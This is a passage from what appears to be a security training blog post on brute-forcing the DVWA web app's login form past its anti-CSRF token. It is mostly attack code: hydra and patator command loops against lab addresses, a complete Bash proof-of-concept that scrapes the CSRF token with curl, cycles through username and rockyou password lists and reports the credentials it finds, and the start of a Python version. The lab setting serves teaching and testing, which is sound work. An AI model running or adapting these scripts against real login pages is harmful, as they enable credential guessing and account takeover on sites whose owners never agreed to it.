&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Patator loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; IP in &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;33&lt;/span&gt; 44&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;\n\n192.168.1.${IP} // ${THREAD}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.${IP}/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID dvwa.cookie &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="s1"&gt;'{print $7}'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;time  &lt;/span&gt;patator  http_fuzz  &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;POST &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.${IP}/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/passwords_clarkson_82.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x ignore:fgrep&lt;span class="o"&gt;=&lt;/span&gt;login.php  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;index.php &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;http_proxy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;127.0.0.1:8080 &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;THREAD&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Proof.of.Concept.Scripts"&gt;&lt;/a&gt;
&lt;h2&gt;Proof of Concept Scripts&lt;/h2&gt;

&lt;p&gt;So here are two Proof of Concept (PoC) scripts, one in Bash and the other is Python. They are really rough templates, and not stable tools to be keep on using. They are not meant to be "fancy" (e.g. no timeouts or no multi-threading). However, they can be fully customised in the attack (such as if we want to use a new anti-CSRF token on each request, which would be required if the token system was implemented correctly).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/g0tmi1k/boot2root-scripts/"&gt;I will put this all on GitHub at the following repository&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-login-bruteforce-http-post-csrf.sh"&gt;Bash Template&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-login-bruteforce-http-post-csrf.py"&gt;Python Template&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;Benchmark&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Bash&lt;/strong&gt;: ~3.8 seconds&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: ~5.8 seconds&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Bash.Template"&gt;&lt;/a&gt;
&lt;h3&gt;Bash Template&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Quick PoC template for HTTP POST form brute force, with anti-CRSF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Target: DVWA v1.10&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#   Date: 2015-10-19&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Author: g0tmi1k ~ https://blog.g0tmi1k.com/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Source: https://blog.g0tmi1k.com/dvwa/login/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Variables&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.33/DVWA&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;USER_LIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/seclists/Usernames/top_shortlist.txt&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;PASS_LIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/seclists/Passwords/rockyou.txt&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Value to look for in response (Whitelisting)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SUCCESS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: index.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Anti CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$( curl -s -c /tmp/dvwa.cookie &amp;quot;&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;/login.php&lt;span class="s2"&gt;&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;'&amp;quot; -f2 )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;[[ &amp;quot;$?&amp;quot; -ne 0 ]] &amp;amp;&amp;amp; echo -e '&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Issue connecting! &lt;span class="c"&gt;#1' &amp;amp;&amp;amp; exit 1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Password loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -r _PASS&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="c"&gt;## Username loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -r _USER&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Increase counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;i+1&lt;span class="o"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Feedback for user&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Try ${i}: ${_USER} // ${_PASS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Connect to server&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;#CSRF=$( curl -s -c /tmp/dvwa.cookie &amp;quot;${URL}/login.php&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | awk -F &amp;quot;'&amp;quot; '{print $2}' )&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nv"&gt;REQUEST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$( curl -s -i -b /tmp/dvwa.cookie --data &amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;_USER&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;_PASS&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;user_token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Login&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;/login.php&lt;span class="s2"&gt;&amp;quot; )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; -ne &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s1"&gt;'\n[!] Issue connecting! #2'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Check response&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;${REQUEST}&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="s2"&gt;&amp;quot;${SUCCESS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$?&amp;quot;&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="c"&gt;## Success!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;\n\n[i] Found!&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Username: ${_USER}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Password: ${_PASS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;break &lt;/span&gt;2
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;USER_LIST&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PASS_LIST&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Clean up&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;rm -f /tmp/dvwa.cookie
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Python.Template"&gt;&lt;/a&gt;
&lt;h3&gt;Python Template&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;span class="line-number"&gt;63&lt;/span&gt;
&lt;span class="line-number"&gt;64&lt;/span&gt;
&lt;span class="line-number"&gt;65&lt;/span&gt;
&lt;span class="line-number"&gt;66&lt;/span&gt;
&lt;span class="line-number"&gt;67&lt;/span&gt;
&lt;span class="line-number"&gt;68&lt;/span&gt;
&lt;span class="line-number"&gt;69&lt;/span&gt;
&lt;span class="line-number"&gt;70&lt;/span&gt;
&lt;span class="line-number"&gt;71&lt;/span&gt;
&lt;span class="line-number"&gt;72&lt;/span&gt;
&lt;span class="line-number"&gt;73&lt;/span&gt;
&lt;span class="line-number"&gt;74&lt;/span&gt;
&lt;span class="line-number"&gt;75&lt;/span&gt;
&lt;span class="line-number"&gt;76&lt;/span&gt;
&lt;span class="line-number"&gt;77&lt;/span&gt;
&lt;span class="line-number"&gt;78&lt;/span&gt;
&lt;span class="line-number"&gt;79&lt;/span&gt;
&lt;span class="line-number"&gt;80&lt;/span&gt;
&lt;span class="line-number"&gt;81&lt;/span&gt;
&lt;span class="line-number"&gt;82&lt;/span&gt;
&lt;span class="line-number"&gt;83&lt;/span&gt;
&lt;span class="line-number"&gt;84&lt;/span&gt;
&lt;span class="line-number"&gt;85&lt;/span&gt;
&lt;span class="line-number"&gt;86&lt;/span&gt;
&lt;span class="line-number"&gt;87&lt;/span&gt;
&lt;span class="line-number"&gt;88&lt;/span&gt;
&lt;span class="line-number"&gt;89&lt;/span&gt;
&lt;span class="line-number"&gt;90&lt;/span&gt;
&lt;span class="line-number"&gt;91&lt;/span&gt;
&lt;span class="line-number"&gt;92&lt;/span&gt;
&lt;span class="line-number"&gt;93&lt;/span&gt;
&lt;span class="line-number"&gt;94&lt;/span&gt;
&lt;span class="line-number"&gt;95&lt;/span&gt;
&lt;span class="line-number"&gt;96&lt;/span&gt;
&lt;span class="line-number"&gt;97&lt;/span&gt;
&lt;span class="line-number"&gt;98&lt;/span&gt;
&lt;span class="line-number"&gt;99&lt;/span&gt;
&lt;span class="line-number"&gt;100&lt;/span&gt;
&lt;span class="line-number"&gt;101&lt;/span&gt;
&lt;span class="line-number"&gt;102&lt;/span&gt;
&lt;span class="line-number"&gt;103&lt;/span&gt;
&lt;span class="line-number"&gt;104&lt;/span&gt;
&lt;span class="line-number"&gt;105&lt;/span&gt;
&lt;span class="line-number"&gt;106&lt;/span&gt;
&lt;span class="line-number"&gt;107&lt;/span&gt;
&lt;span class="line-number"&gt;108&lt;/span&gt;
&lt;span class="line-number"&gt;109&lt;/span&gt;
&lt;span class="line-number"&gt;110&lt;/span&gt;
&lt;span class="line-number"&gt;111&lt;/span&gt;
&lt;span class="line-number"&gt;112&lt;/span&gt;
&lt;span class="line-number"&gt;113&lt;/span&gt;
&lt;span class="line-number"&gt;114&lt;/span&gt;
&lt;span class="line-number"&gt;115&lt;/span&gt;
&lt;span class="line-number"&gt;116&lt;/span&gt;
&lt;span class="line-number"&gt;117&lt;/span&gt;
&lt;span class="line-number"&gt;118&lt;/span&gt;
&lt;span class="line-number"&gt;119&lt;/span&gt;
&lt;span class="line-number"&gt;120&lt;/span&gt;
&lt;span class="line-number"&gt;121&lt;/span&gt;
&lt;span class="line-number"&gt;122&lt;/span&gt;
&lt;span class="line-number"&gt;123&lt;/span&gt;
&lt;span class="line-number"&gt;124&lt;/span&gt;
&lt;span class="line-number"&gt;125&lt;/span&gt;
&lt;span class="line-number"&gt;126&lt;/span&gt;
&lt;span class="line-number"&gt;127&lt;/span&gt;
&lt;span class="line-number"&gt;128&lt;/span&gt;
&lt;span class="line-number"&gt;129&lt;/span&gt;
&lt;span class="line-number"&gt;130&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="python"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Quick PoC template for HTTP POST form brute force, with anti-CRSF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Target: DVWA v1.10&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#   Date: 2015-10-19&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Author: g0tmi1k ~ https://blog.g0tmi1k.com/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Source: https://blog.g0tmi1k.com/dvwa/login/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
